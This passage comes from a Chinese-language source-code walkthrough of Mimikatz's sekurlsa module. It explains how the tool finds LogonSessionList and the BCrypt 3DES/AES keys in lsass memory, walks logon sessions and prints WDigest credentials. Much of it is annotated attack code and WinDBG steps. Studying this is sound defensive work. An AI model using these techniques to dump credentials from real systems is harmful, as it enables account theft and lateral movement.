            // CurrentPtr 从 lsasvr.dll 的基地址开始循环，依次递增一个地址，最大地址数为 limite
            for(CurrentPtr = (PBYTE) Search->kull_m_memoryRange.kull_m_memoryAdress.address; !status && (CurrentPtr + Length <= limite); CurrentPtr++)
                // 比较 Pattern->address 和 CurrentPtr 指向的两个内存块是否相同，如果相同则说明找到了特征码
                status = RtlEqualMemory(Pattern->address, CurrentPtr, Length);
            CurrentPtr--;
            break;
        case KULL_M_MEMORY_TYPE_PROCESS:
        case KULL_M_MEMORY_TYPE_FILE:
        case KULL_M_MEMORY_TYPE_KERNEL:
            // 为 sBuffer.kull_m_memoryRange.kull_m_memoryAdress.address 开辟内存空间
            if(sBuffer.kull_m_memoryRange.kull_m_memoryAdress.address = LocalAlloc(LPTR, Search->kull_m_memoryRange.size))
            {
                // 将包含 lsasvr.dll 模块的那部分内存复制到 sBuffer.kull_m_memoryRange.kull_m_memoryAdress 所指向的内存中
                if(kull_m_memory_copy(&sBuffer.kull_m_memoryRange.kull_m_memoryAdress, &Search->kull_m_memoryRange.kull_m_memoryAdress, Search->kull_m_memoryRange.size))
                    // 再次调用 kull_m_memory_search 函数将进入到 case KULL_M_MEMORY_TYPE_OWN:
                    if(status = kull_m_memory_search(Pattern, Length, &sBuffer, FALSE))
                        CurrentPtr = (PBYTE) Search->kull_m_memoryRange.kull_m_memoryAdress.address + (((PBYTE) sBuffer.result) - (PBYTE) sBuffer.kull_m_memoryRange.kull_m_memoryAdress.address);
                LocalFree(sBuffer.kull_m_memoryRange.kull_m_memoryAdress.address);
            }
            break;
        case KULL_M_MEMORY_TYPE_PROCESS_DMP:
            // ......
        default:
            break;
        }
        break;
    default:
        break;
    }

    Search->result = status ? CurrentPtr : NULL;

    return status;
}
```

该函数首先划分出 lsasrv.dll 所属的内存空间从而确定要搜索的范围大小 `limite`，然后遍历 `limite` 范围的内存，通过 `RtlEqualMemory()` 函数匹配出与特征码相同的内存块，最终确定特征码的地址。得到的特征码地址被赋值给 `Search->result`，回到 `kuhl_m_sekurlsa_utils_search_generic()` 函数中就是 `sMemory.result`。

接着，回到 `kuhl_m_sekurlsa_utils_search_generic()` 函数中开始定位 `LogonSessionList` 变量。首先从 `currentReference` 中获取第一个偏移量加到特征码地址上，如下所示。

```c++
aLsassMemory.address = (PBYTE) sMemory.result + currentReference->Offsets.off0;
```

这里获得的是 `lea rcx` 指令中保存 `LogonSessionList` 变量偏移量的四个字节序列的地址。然后通过 `kull_m_memory_copy()` 函数获取这四个字节序列的值到 `offset` 中，此时 `offset` 中保存的是 `LogonSessionList` 变量真正的偏移量。将 `sizeof(LONG)` 和 `offset` 加到 `rip` 指向的地址上即可得到 `LogonSessionList` 变量的地址，如下所示。

```c++
aLocalMemory.address = &offset;
if(pLib->isInit = kull_m_memory_copy(&aLocalMemory, &aLsassMemory, sizeof(LONG)))
·*genericPtr = ((PBYTE) aLsassMemory.address + sizeof(LONG) + offset);
```

拿到 `LogonSessionList` 变量的地址后，返回 `kuhl_m_sekurlsa_acquireLSA()` 函数，将继续调用 `lsassLocalHelper->AcquireKeys` 所指的函数。在这里是 `kuhl_m_sekurlsa_nt6_acquireKeys()` 函数，用于获取加密用户凭据的密钥。

```c++
if(kuhl_m_sekurlsa_utils_search(&cLsass, &kuhl_m_sekurlsa_msv_package.Module))
{
    // 继续调用 kuhl_m_sekurlsa_nt6_acquireKeys 函数
    status = lsassLocalHelper->AcquireKeys(&cLsass, &lsassPackages[0]->Module.Informations);
    if(!NT_SUCCESS(status))
        PRINT_ERROR(L"Key import\n");
}
```

Extract BCrypt Key &amp; Vector
-------------------------------

跟进 `kuhl_m_sekurlsa_nt6_acquireKeys()` 函数：

- sekurlsa\\crypto\\kuhl\_m\_sekurlsa\_nt6.c

```c++
KIWI_BCRYPT_GEN_KEY k3Des, kAes;
BYTE InitializationVector[16];
// ......
NTSTATUS kuhl_m_sekurlsa_nt6_acquireKeys(PKUHL_M_SEKURLSA_CONTEXT cLsass, PKULL_M_PROCESS_VERY_BASIC_MODULE_INFORMATION lsassLsaSrvModule)
{
    NTSTATUS status = STATUS_NOT_FOUND;
    KULL_M_MEMORY_ADDRESS aLsassMemory = {NULL, cLsass->hLsassMem}, aLocalMemory = {NULL, &KULL_M_MEMORY_GLOBAL_OWN_HANDLE};
    KULL_M_MEMORY_SEARCH sMemory = {{{lsassLsaSrvModule->DllBase.address, cLsass->hLsassMem}, lsassLsaSrvModule->SizeOfImage}, NULL};
#if defined(_M_X64)
    LONG offset64;
#endif
    PKULL_M_PATCH_GENERIC currentReference;
    if(currentReference = kull_m_patch_getGenericFromBuild(PTRN_WIN8_LsaInitializeProtectedMemory_KeyRef, ARRAYSIZE(PTRN_WIN8_LsaInitializeProtectedMemory_KeyRef), cLsass->osContext.BuildNumber))
    {
        aLocalMemory.address = currentReference->Search.Pattern;
        // 根据特征码获取 LsaInitializeProtectedMemory_KeyRef 的地址
        if(kull_m_memory_search(&aLocalMemory, currentReference->Search.Length, &sMemory, FALSE))
        {
            // 特征码的地址加上偏移量 off0 到达保存 InitializationVector 偏移量的那四个字节的地址
            aLsassMemory.address = (PBYTE) sMemory.result + currentReference->Offsets.off0;
            #if defined(_M_ARM64)
            // ......
            #elif defined(_M_X64)
            aLocalMemory.address = &offset64;
            // 获取包含 InitializationVector 偏移量的那四个字节的内容，并把加到特征码的地址上，最终得到了 InitializationVector 的绝对地址
            if(kull_m_memory_copy(&aLocalMemory, &aLsassMemory, sizeof(LONG)))
            {
                aLsassMemory.address = (PBYTE) aLsassMemory.address + sizeof(LONG) + offset64;
            #elif defined(_M_IX86)
            // ......
            #endif
                 // 全局变量 InitializationVector 中将存储初始化向量
                aLocalMemory.address = InitializationVector;   
                if(kull_m_memory_copy(&aLocalMemory, &aLsassMemory, sizeof(InitializationVector)))
                {
                    // 特征码的基地址加上偏移量 off1 到达保存 h3DesKey 偏移量的那四个字节的地址
                    aLsassMemory.address = (PBYTE) sMemory.result + currentReference->Offsets.off1;
                    if(kuhl_m_sekurlsa_nt6_acquireKey(&aLsassMemory, &cLsass->osContext, &k3Des, 
                        #if defined(_M_ARM64)
                        currentReference->Offsets.armOff1
                        #else
                        0
                        #endif
                        ))
                    {
                        aLsassMemory.address = (PBYTE) sMemory.result + currentReference->Offsets.off2;
                        if(kuhl_m_sekurlsa_nt6_acquireKey(&aLsassMemory, &cLsass->osContext, &kAes,
                            #if defined(_M_ARM64)
                            currentReference->Offsets.armOff2
                            #else
                            0
                            #endif
                            ))
                            status = STATUS_SUCCESS;
                    }
                }
            }
        }
    }
    return status;
}
```

首先，同样是通过 `kull_m_patch_getGenericFromBuild()` 函数选出适用于当前系统版本的 `PTRN_WIN8_LsaInitializeProtectedMemory_KeyRef` 中的特征码条目，用来定位加密用户凭据的初始化向量 `InitializationVector` 和 `h3DesKey`、`hAesKey` 密钥。

在 `kuhl_m_sekurlsa_nt6_acquireKeys()` 函数中，先通过与 `kuhl_m_sekurlsa_utils_search_generic()` 函数类似的逻辑获取 `InitializationVector` 的地址，然后调用两次 `kuhl_m_sekurlsa_nt6_acquireKey()` 函数定位 `h3DesKey` 和 `hAesKey` 的地址。

跟进 `kuhl_m_sekurlsa_nt6_acquireKey()` 函数：

- sekurlsa\\crypto\\kuhl\_m\_sekurlsa\_nt6.c

```c++
BOOL kuhl_m_sekurlsa_nt6_acquireKey(PKULL_M_MEMORY_ADDRESS aLsassMemory, PKUHL_M_SEKURLSA_OS_CONTEXT pOs, PKIWI_BCRYPT_GEN_KEY pGenKey, LONG armOffset) // TODO:ARM64
{
    BOOL status = FALSE;
    KULL_M_MEMORY_ADDRESS aLocalMemory = {&aLsassMemory->address, &KULL_M_MEMORY_GLOBAL_OWN_HANDLE};
    KIWI_BCRYPT_HANDLE_KEY hKey; PKIWI_HARD_KEY pHardKey;
    PVOID buffer; SIZE_T taille; LONG offset;
    // 根据 BuildNumber 中的系统版本，在几种 KIWI_BCRYPT_KEY 结构中选择适合的版本
    if(pOs->BuildNumber < KULL_M_WIN_MIN_BUILD_8)
    {
        taille = sizeof(KIWI_BCRYPT_KEY);
        offset = FIELD_OFFSET(KIWI_BCRYPT_KEY, hardkey);
    }
    else if(pOs->BuildNumber < KULL_M_WIN_MIN_BUILD_BLUE)
    {
        taille = sizeof(KIWI_BCRYPT_KEY8);
        offset = FIELD_OFFSET(KIWI_BCRYPT_KEY8, hardkey);
    }
    else
    {
        // taille 为 KIWI_BCRYPT_KEY81 结构体的大小
        taille = sizeof(KIWI_BCRYPT_KEY81);
        // offset 为 hardkey 属性在 KIWI_BCRYPT_KEY81 结构体中的偏移
        offset = FIELD_OFFSET(KIWI_BCRYPT_KEY81, hardkey);
    }

    if(buffer = LocalAlloc(LPTR, taille))
    {
    #if defined(_M_ARM64)
        // ......
    #elif defined(_M_X64)
        LONG offset64;
        aLocalMemory.address = &offset64;
        // 获取保存 h3DesKey 偏移量的那四个字节的值，并加到 rip 指令的地址上，最终得到了 h3DesKey 变量的地址
        if(kull_m_memory_copy(&aLocalMemory, aLsassMemory, sizeof(LONG)))
        {
            aLsassMemory->address = (PBYTE) aLsassMemory->address + sizeof(LONG) + offset64;
            aLocalMemory.address = &aLsassMemory->address;
    #elif defined(_M_IX86)
        // ......
    #endif
            // 将 BCRYPT_KEY_HANDLE 结构的 h3DesKey 变量复制到 aLocalMemory.address 指向的内存中
            if(kull_m_memory_copy(&aLocalMemory, aLsassMemory, sizeof(PVOID)))
            {
                aLocalMemory.address = &hKey;
                if(kull_m_memory_copy(&aLocalMemory, aLsassMemory, sizeof(KIWI_BCRYPT_HANDLE_KEY)) && hKey.tag == 'UUUR')
                {
                    // 将 KIWI_BCRYPT_HANDLE_KEY::key，也就是 KIWI_BCRYPT_KEY81 结构复制到 buffer 指向的内存中
                    aLocalMemory.address = buffer; aLsassMemory->address = hKey.key;
                    if(kull_m_memory_copy(&aLocalMemory, aLsassMemory, taille) && ((PKIWI_BCRYPT_KEY) buffer)->tag == 'MSSK') // same as 8
                    {
                        // buffer 加上 offset 到达 KIWI_BCRYPT_KEY::hardkey 的地址
                        pHardKey = (PKIWI_HARD_KEY) ((PBYTE) buffer + offset);
                        // 将 KIWI_HARD_KEY::data 复制到 aLocalMemory.address 指向的内存中
                        if(aLocalMemory.address = LocalAlloc(LPTR, pHardKey->cbSecret))
                        {
                            aLsassMemory->address = (PBYTE) hKey.key + offset + FIELD_OFFSET(KIWI_HARD_KEY, data);
                            if(kull_m_memory_copy(&aLocalMemory, aLsassMemory, pHardKey->cbSecret))
                            {
                                __try
                                {
                                    // 通过 BCryptGenerateSymmetricKey 函数创建一个密钥对象
                                    status = NT_SUCCESS(BCryptGenerateSymmetricKey(pGenKey->hProvider, &pGenKey->hKey, pGenKey->pKey, pGenKey->cbKey, (PUCHAR) aLocalMemory.address, pHardKey->cbSecret, 0));
                                }
                                __except(GetExceptionCode() == ERROR_DLL_NOT_FOUND){}
                            }
                            LocalFree(aLocalMemory.address);
                        }
                    }
                }
            }
        }
        LocalFree(buffer);
    }
    return status;
}
```

这里以获取 `h3DesKey` 为例，获取 `hAesKey` 的方法相同。首先通过 `kull_m_memory_copy()` 函数获取保存 `h3DesKey` 偏移量的那四个字节的值，并加到 `rip` 指令的地址上得到了 `h3DesKey` 变量的地址，然后再将 `h3DesKey` 变量复制到 `hKey` 指向的内存中。这里需要知道的 `h3DesKey` 变量是一个 `BCRYPT_KEY_HANDLE` 的句柄结构，由于句柄相当于指针的指针，因此该句柄中保存着存储密钥内容的那块内存的指针的指针，指向密钥的指针结构，可以在 Mimikatz 中找到了这个结构：

```c++
typedef struct _KIWI_BCRYPT_HANDLE_KEY {
    ULONG size;
    ULONG tag;  // 'UUUR'
    PVOID hAlgorithm;
    PKIWI_BCRYPT_KEY key;
    PVOID unk0;
} KIWI_BCRYPT_HANDLE_KEY, *PKIWI_BCRYPT_HANDLE_KEY;
```

此外，可以看到 `KIWI_BCRYPT_HANDLE_KEY` 中的属性 `key` 是一个指向 `KIWI_BCRYPT_KEY` 结构体的指针，由于当前测试环境为 Windows 10 x64 1903，因此这使用的是 `KIWI_BCRYPT_KEY81` 版本，其声明如下。

```c++
typedef struct _KIWI_BCRYPT_KEY81 {
    ULONG size;
    ULONG tag;  // 'MSSK'
    ULONG type;
    ULONG unk0;
    ULONG unk1;
    ULONG unk2;
    ULONG unk3;
    ULONG unk4;
    PVOID unk5; // before, align in x64
    ULONG unk6;
    ULONG unk7;
    ULONG unk8;
    ULONG unk9;
    KIWI_HARD_KEY hardkey;
} KIWI_BCRYPT_KEY81, *PKIWI_BCRYPT_KEY81;
```

此外 `KIWI_BCRYPT_KEY81` 的最后一个成员 `hardkey` 是一个 `KIWI_HARD_KEY` 结构体，该结构声明如下，其中的字节数组 `data` 保存了实际的密钥值，而 `cbSecret` 是 `data` 的大小。

```c++
typedef struct _KIWI_HARD_KEY {
    ULONG cbSecret;
    BYTE data[ANYSIZE_ARRAY]; // etc...
} KIWI_HARD_KEY, *PKIWI_HARD_KEY;
```

我们可以使用 WinDBG 来提取这个密钥，如下所示：

![image-20221218125411580](https://shs3.b.qianxin.com/attack_forum/2023/05/attach-d39b8723c9b436425f369c3bbcb28fbfbcc8e6e4.png)

我们可以通过相同的过程来提取 `hAesKey` 中的密钥。

最后再调用 `BCryptGenerateSymmetricKey()` 函数，通过已获取的密钥内容创建一个密钥对象，并由 `pGenKey->hKey` 接收得到的密钥句柄，用于后续的解密过程。

至此，整个 `kuhl_m_sekurlsa_acquireLSA()` 函数调用结束，返回 `kuhl_m_sekurlsa_enum()` 函数中枚举用户信息。

Enumerate Session Information
=============================

Pivoting From LogonSessionList
------------------------------

我们曾经讲到过，`LogonSessionList` 是一个 `LIST_ENTRY` 结构体，因此它也是一个双向链表，可以使用 WinDBG 命令遍历浏览，如下图所示。

![image-20221218125559775](https://shs3.b.qianxin.com/attack_forum/2023/05/attach-5ce49f9535ddb970d6b6e2f70d0b6760cf748255.png)

该结构中的 `Flink` 指向真正的模块链表，链表的每个成员都是一个包含了用户会话信息的结构体，具体结构因不同系统而异，在 Windows 10 x64 1903 系统中，Mimikatz 对其声明如下。

```c++
typedef struct _KIWI_MSV1_0_LIST_63 {
    struct _KIWI_MSV1_0_LIST_63 *Flink; //off_2C5718
    struct _KIWI_MSV1_0_LIST_63 *Blink; //off_277380
    PVOID unk0; // unk_2C0AC8
    ULONG unk1; // 0FFFFFFFFh
    PVOID unk2; // 0
    ULONG unk3; // 0
    ULONG unk4; // 0
    ULONG unk5; // 0A0007D0h
    HANDLE hSemaphore6; // 0F9Ch
    PVOID unk7; // 0
    HANDLE hSemaphore8; // 0FB8h
    PVOID unk9; // 0
    PVOID unk10; // 0
    ULONG unk11; // 0
    ULONG unk12; // 0 
    PVOID unk13; // unk_2C0A28
    LUID LocallyUniqueIdentifier;
    LUID SecondaryLocallyUniqueIdentifier;
    BYTE waza[12]; /// to do (maybe align)
    LSA_UNICODE_STRING UserName;
    LSA_UNICODE_STRING Domaine;
    PVOID unk14;
    PVOID unk15;
    LSA_UNICODE_STRING Type;
    PSID  pSid;
    ULONG LogonType;
    PVOID unk18;
    ULONG Session;
    LARGE_INTEGER LogonTime; // autoalign x86
    LSA_UNICODE_STRING LogonServer;
    PKIWI_MSV1_0_CREDENTIALS Credentials;
    PVOID unk19;
    PVOID unk20;
    PVOID unk21;
    ULONG unk22;
    ULONG unk23;
    ULONG unk24;
    ULONG unk25;
    ULONG unk26;
    PVOID unk27;
    PVOID unk28;
    PVOID unk29;
    PVOID CredentialManager;
} KIWI_MSV1_0_LIST_63, *PKIWI_MSV1_0_LIST_63;
```

可以看到，该结构里包含了登录 ID（LocallyUniqueIdentifier）、用户名（UserName）、域名（Domaine）、登录时间（LogonTime）、凭据（Credentials）以及登录到的服务器（LogonServer）等信息，这里我们真正需要的是登录 ID（LocallyUniqueIdentifier）。

Enumerate User Information
--------------------------

回到 `kuhl_m_sekurlsa_enum()` 函数中，定义了以下部分代码用于枚举用户信息。

```c++
if(NT_SUCCESS(status))
{
    sessionData.cLsass = &cLsass;
    sessionData.lsassLocalHelper = lsassLocalHelper;

    if(cLsass.osContext.BuildNumber < KULL_M_WIN_MIN_BUILD_2K3)
        helper = &lsassEnumHelpers[0];
    else if(cLsass.osContext.BuildNumber < KULL_M_WIN_MIN_BUILD_VISTA)
        helper = &lsassEnumHelpers[1];
    else if(cLsass.osContext.BuildNumber < KULL_M_WIN_MIN_BUILD_7)
        helper = &lsassEnumHelpers[2];
    else if(cLsass.osContext.BuildNumber < KULL_M_WIN_MIN_BUILD_8)
        helper = &lsassEnumHelpers[3];
    else if(cLsass.osContext.BuildNumber < KULL_M_WIN_MIN_BUILD_BLUE)
        helper = &lsassEnumHelpers[5];
    else
        helper = &lsassEnumHelpers[6];
    if((cLsass.osContext.BuildNumber >= KULL_M_WIN_MIN_BUILD_7) && (cLsass.osContext.BuildNumber < KULL_M_WIN_MIN_BUILD_BLUE) && (kuhl_m_sekurlsa_msv_package.Module.Informations.TimeDateStamp > 0x53480000))
        helper++; // yeah, really, I do that =)

    securityStruct.hMemory = cLsass.hLsassMem;
    if(securityStruct.address = LogonSessionListCount)
        // 把 LogonSessionListCount 复制到 nbListes 中
        kull_m_memory_copy(&data, &securityStruct, sizeof(ULONG));

    // for(i = 0; i < LogonSessionListCount; i++)
    for(i = 0; i < nbListes; i++)
    {
        securityStruct.address = &LogonSessionList[i];
        data.address = &pStruct;
        data.hMemory = &KULL_M_MEMORY_GLOBAL_OWN_HANDLE;
        if(aBuffer.address = LocalAlloc(LPTR, helper->tailleStruct))
        {
            // 把 LogonSessionList[i] 复制到 pStruct 指向的内存中
            if(kull_m_memory_copy(&data, &securityStruct, sizeof(PVOID)))
            {
                data.address = pStruct;
                data.hMemory = securityStruct.hMemory;

                // while((pStruct != &LogonSessionList[i]) && retCallback)
                while((data.address != securityStruct.address) && retCallback)
                {
                    // 把 LogonSessionList[i]（pStruct）复制到 aBuffer.address 指向的内存中
                    if(kull_m_memory_copy(&aBuffer, &data, helper->tailleStruct))
                    {
                        sessionData.LogonId     = (PLUID)           ((PBYTE) aBuffer.address + helper->offsetToLuid);
                        sessionData.LogonType   = *((PULONG)        ((PBYTE) aBuffer.address + helper->offsetToLogonType));
                        sessionData.Session     = *((PULONG)        ((PBYTE) aBuffer.address + helper->offsetToSession));
                        sessionData.UserName    = (PUNICODE_STRING) ((PBYTE) aBuffer.address + helper->offsetToUsername);
                        sessionData.LogonDomain = (PUNICODE_STRING) ((PBYTE) aBuffer.address + helper->offsetToDomain);
                        sessionData.pCredentials= *(PVOID *)        ((PBYTE) aBuffer.address + helper->offsetToCredentials);
                        sessionData.pSid        = *(PSID *)         ((PBYTE) aBuffer.address + helper->offsetToPSid);
                        sessionData.pCredentialManager = *(PVOID *) ((PBYTE) aBuffer.address + helper->offsetToCredentialManager);
                        sessionData.LogonTime   = *((PFILETIME)     ((PBYTE) aBuffer.address + helper->offsetToLogonTime));
                        sessionData.LogonServer = (PUNICODE_STRING) ((PBYTE) aBuffer.address + helper->offsetToLogonServer);

                        kull_m_process_getUnicodeString(sessionData.UserName, cLsass.hLsassMem);
                        kull_m_process_getUnicodeString(sessionData.LogonDomain, cLsass.hLsassMem);
                        kull_m_process_getUnicodeString(sessionData.LogonServer, cLsass.hLsassMem);
                        kull_m_process_getSid(&sessionData.pSid, cLsass.hLsassMem);
                        // callback 为 kuhl_m_sekurlsa_enum_callback_logondata
                        retCallback = callback(&sessionData, pOptionalData);

                        if(sessionData.UserName->Buffer)
                            LocalFree(sessionData.UserName->Buffer);
                        if(sessionData.LogonDomain->Buffer)
                            LocalFree(sessionData.LogonDomain->Buffer);
                        if(sessionData.LogonServer->Buffer)
                            LocalFree(sessionData.LogonServer->Buffer);
                        if(sessionData.pSid)
                            LocalFree(sessionData.pSid);

                        data.address = ((PLIST_ENTRY) (aBuffer.address))->Flink;
                    }
                    else break;
                }
            }
            LocalFree(aBuffer.address);
        }
    }
}
```

这里先根据 `BuildNumber` 中的系统版本，从 `lsassEnumHelpers` 中选择适合的条目，这是一个 `KUHL_M_SEKURLSA_ENUM_HELPER` 结构体的数组，用于保存用户的各种信息在 `KIWI_MSV1_0_LIST_63` 中的偏移量，其声明如下。

```c++
typedef struct _KUHL_M_SEKURLSA_ENUM_HELPER {
    SIZE_T tailleStruct;
    ULONG offsetToLuid;
    ULONG offsetToLogonType;
    ULONG offsetToSession;
    ULONG offsetToUsername;
    ULONG offsetToDomain;
    ULONG offsetToCredentials;
    ULONG offsetToPSid;
    ULONG offsetToCredentialManager;
    ULONG offsetToLogonTime;
    ULONG offsetToLogonServer;
} KUHL_M_SEKURLSA_ENUM_HELPER, *PKUHL_M_SEKURLSA_ENUM_HELPER;
```

然后通过遍历 `LogonSessionList` 依次得到登录 ID、用户名、域名、凭据、SID、登录时间以及登录到的服务器等信息，并将让它们临时保存在 `sessionData` 中，这是一个 `KIWI_BASIC_SECURITY_LOGON_SESSION_DATA` 结构体，其声明如下。

```c++
typedef struct _KIWI_BASIC_SECURITY_LOGON_SESSION_DATA {
    PKUHL_M_SEKURLSA_CONTEXT    cLsass;
    const KUHL_M_SEKURLSA_LOCAL_HELPER * lsassLocalHelper;
    PLUID                       LogonId;
    PLSA_UNICODE_STRING         UserName;
    PLSA_UNICODE_STRING         LogonDomain;
    ULONG                       LogonType;
    ULONG                       Session;
    PVOID                       pCredentials;
    PSID                        pSid;
    PVOID                       pCredentialManager;
    FILETIME                    LogonTime;
    PLSA_UNICODE_STRING         LogonServer;
} KIWI_BASIC_SECURITY_LOGON_SESSION_DATA, *PKIWI_BASIC_SECURITY_LOGON_SESSION_DATA;
```

最后将 `&sessionData` 和 `pOptionalData` 传入回调函数 `kuhl_m_sekurlsa_enum_callback_logondata()`。

Print logon Information
=======================

Print Basic User Information
----------------------------

跟进 `kuhl_m_sekurlsa_enum_callback_logondata()` 函数：

- sekurlsa\\kuhl\_m\_sekurlsa.c

```c++
BOOL CALLBACK kuhl_m_sekurlsa_enum_callback_logondata(IN PKIWI_BASIC_SECURITY_LOGON_SESSION_DATA pData, IN OPTIONAL LPVOID pOptionalData)
{
    PKUHL_M_SEKURLSA_GET_LOGON_DATA_CALLBACK_DATA pLsassData = (PKUHL_M_SEKURLSA_GET_LOGON_DATA_CALLBACK_DATA) pOptionalData;
    ULONG i;
    //PDWORD sub = NULL;
    if((pData->LogonType != Network))
    {
        kuhl_m_sekurlsa_printinfos_logonData(pData);
        // 遍历 pLsassData 中的所有 lsass 包，这里只有一个 kuhl_m_sekurlsa_msv_package
        for(i = 0; i < pLsassData->nbPackages; i++)
        {
            if(pLsassData->lsassPackages[i]->Module.isPresent && lsassPackages[i]->isValid)
            {
                kprintf(L"\t%s :\t", pLsassData->lsassPackages[i]->Name);
                // CredsForLUIDFunc 为 kuhl_m_sekurlsa_enum_logon_callback_msv
                pLsassData->lsassPackages[i]->CredsForLUIDFunc(pData);
                kprintf(L"\n");
            }
        }
    }
    return TRUE;
}
```

在该函数中，先判断登录类型是否是 Network，如果不是，则对传入的用户登录信息 `pData` 调用 `kuhl_m_sekurlsa_printinfos_logonData()` 函数，打印用户的会话、用户名、域名、登录到的服务器、登陆时间以及 SID 登信息。

然后，继续对 `pData` 调用 lsass 包中的 `CredsForLUIDFunc` 指向的函数，在这里是 `kuhl_m_sekurlsa_enum_logon_callback_wdigest()` 函数。

Print Credentials Information
-----------------------------

跟进 `kuhl_m_sekurlsa_enum_logon_callback_wdigest()` 函数：

- sekurlsa\\packages\\kuhl\_m\_sekurlsa\_wdigest.c

```c++
PKIWI_WDIGEST_LIST_ENTRY l_LogSessList = NULL;
LONG offsetWDigestPrimary = 0;

// ...

void CALLBACK kuhl_m_sekurlsa_enum_logon_callback_wdigest(IN PKIWI_BASIC_SECURITY_LOGON_SESSION_DATA pData)
{
    KULL_M_MEMORY_ADDRESS aLocalMemory = {NULL, &KULL_M_MEMORY_GLOBAL_OWN_HANDLE}, aLsassMemory = {NULL, pData->cLsass->hLsassMem};
    SIZE_T taille;
    BOOL wasNotInit = !kuhl_m_sekurlsa_wdigest_package.Module.isInit;

    if(kuhl_m_sekurlsa_wdigest_package.Module.isInit || kuhl_m_sekurlsa_utils_search_generic(pData->cLsass, &kuhl_m_sekurlsa_wdigest_package.Module, WDigestReferences, ARRAYSIZE(WDigestReferences), (PVOID *) &l_LogSessList, NULL, NULL, &offsetWDigestPrimary))
    {
        #if defined(_M_ARM64)
        if(wasNotInit)
            l_LogSessList = (PKIWI_WDIGEST_LIST_ENTRY)((PBYTE)l_LogSessList + sizeof(RTL_CRITICAL_SECTION));
        #endif
        aLsassMemory.address = l_LogSessList;
        taille = offsetWDigestPrimary + sizeof(KIWI_GENERIC_PRIMARY_CREDENTIAL);
        if(aLsassMemory.address = kuhl_m_sekurlsa_utils_pFromLinkedListByLuid(&aLsassMemory, FIELD_OFFSET(KIWI_WDIGEST_LIST_ENTRY, LocallyUniqueIdentifier), pData->LogonId))
        {
            if(aLocalMemory.address = LocalAlloc(LPTR, taille))
            {
                if(kull_m_memory_copy(&aLocalMemory, &aLsassMemory, taille))
                    kuhl_m_sekurlsa_genericCredsOutput((PKIWI_GENERIC_PRIMARY_CREDENTIAL) ((PBYTE) aLocalMemory.address + offsetWDigestPrimary), pData, 0);
                LocalFree(aLocalMemory.address);
            }
        }
    } else kprintf(L"KO");
}
```

`kuhl_m_sekurlsa_enum_logon_callback_wdigest()` 函数内部首先调用 `kuhl_m_sekurlsa_utils_search_generic()` 函数来定位 `l_LogSessList` 变量，并将包含凭据信息的 `KIWI_GENERIC_PRIMARY_CREDENTIAL` 相对于 `KIWI_WDIGEST_LIST_ENTRY` 结构的起始偏移量赋值给 `offsetWDigestPrimary`。

然后，遍历整个`l_LogSessList` 链表，并通过 `kuhl_m_sekurlsa_utils_pFromLinkedListByLuid()` 函数对 `l_LogSessList` 中的 `LocallyUniqueIdentifier` 与之前获取到的 `LogonSessionList` 中的登录 ID 进行比较，`kuhl_m_sekurlsa_utils_pFromLinkedListByLuid()` 定义如下。

```cpp
PVOID kuhl_m_sekurlsa_utils_pFromLinkedListByLuid(PKULL_M_MEMORY_ADDRESS pSecurityStruct, ULONG LUIDoffset, PLUID luidToFind)
{
    PVOID resultat = NULL, pStruct;
    KULL_M_MEMORY_ADDRESS data = {&pStruct, &KULL_M_MEMORY_GLOBAL_OWN_HANDLE}, aBuffer = {NULL, &KULL_M_MEMORY_GLOBAL_OWN_HANDLE};

    if(aBuffer.address = LocalAlloc(LPTR, LUIDoffset + sizeof(LUID)))
    {
        // 将 pSecurityStruct 也就是 l_LogSessList 复制到 pStruct 中
        if(kull_m_memory_copy(&data, pSecurityStruct, sizeof(PVOID)))
        {
            data.address = pStruct;
            data.hMemory = pSecurityStruct->hMemory;
            // 如果 pStruct != l_LogSessList
            while(data.address != pSecurityStruct->address)
            {
                // ReadProcessMemory(cLsass.hProcess, pStruct, aBuffer.address, sizeof(KIWI_WDIGEST_LIST_ENTRY), NULL)
                if(kull_m_memory_copy(&aBuffer, &data, LUIDoffset + sizeof(LUID)))
                {
                    if(SecEqualLuid(luidToFind, (PLUID) ((PBYTE)(aBuffer.address) + LUIDoffset)))
                    {
                        resultat = data.address;
                        break;
                    }
                    data.address = ((PLIST_ENTRY) (aBuffer.address))->Flink;
                }
                else break;
            }
        }
        LocalFree(aBuffer.address);
    }
    return resultat;
}
```

如果 `l_LogSessList` 中的 `LocallyUniqueIdentifier` 与之前获取到的 `LogonSessionList` 中的登录 ID 相等，则进入 `kuhl_m_sekurlsa_genericCredsOutput()` 函数打印凭据信息，如下所示。

```cpp
VOID kuhl_m_sekurlsa_genericCredsOutput(PKIWI_GENERIC_PRIMARY_CREDENTIAL mesCreds, PKIWI_BASIC_SECURITY_LOGON_SESSION_DATA pData, ULONG flags)
{
    PUNICODE_STRING username = NULL, domain = NULL, password = NULL;
    PKIWI_CREDENTIAL_KEYS pKeys = NULL;
    PKERB_HASHPASSWORD_GENERIC pHashPassword;
    UNICODE_STRING buffer;
    DWORD type, i;
    BOOL isNull = FALSE;
    PWSTR sid = NULL;
    PBYTE msvCredentials;
    const MSV1_0_PRIMARY_HELPER * pMSVHelper;
#if defined(_M_X64) || defined(_M_ARM64)
    DWORD cbLsaIsoOutput;
    PBYTE lsaIsoOutput;
    PLSAISO_DATA_BLOB blob = NULL;
#endif
    SHA_CTX shaCtx;
    SHA_DIGEST shaDigest;

    if(mesCreds)
    {
        ConvertSidToStringSid(pData->pSid, &sid);
        if(flags & KUHL_SEKURLSA_CREDS_DISPLAY_CREDENTIAL)
        {
            // ...
        }
        else if(flags & KUHL_SEKURLSA_CREDS_DISPLAY_CLOUDAP_PRT)
        {
            // ...
        }
        else if(flags & KUHL_SEKURLSA_CREDS_DISPLAY_PINCODE)
        {
            // ...
        }
        else if(flags & KUHL_SEKURLSA_CREDS_DISPLAY_KEY_LIST)
        {
            // ...
        }
        else
        {
            // ...

            if(mesCreds->UserName.Buffer || mesCreds->Domaine.Buffer || mesCreds->Password.Buffer)
            {
                if(kull_m_process_getUnicodeString(&mesCreds->UserName, cLsass.hLsassMem) && kull_m_string_suspectUnicodeString(&mesCreds->UserName))
                {
                    if(!(flags & KUHL_SEKURLSA_CREDS_DISPLAY_DOMAIN))
                        username = &mesCreds->UserName;
                    else
                        domain = &mesCreds->UserName;
                }
                if(kull_m_process_getUnicodeString(&mesCreds->Domaine, cLsass.hLsassMem) && kull_m_string_suspectUnicodeString(&mesCreds->Domaine))
                {
                    if(!(flags & KUHL_SEKURLSA_CREDS_DISPLAY_DOMAIN))
                        domain = &mesCreds->Domaine;
                    else
                        username = &mesCreds->Domaine;
                }
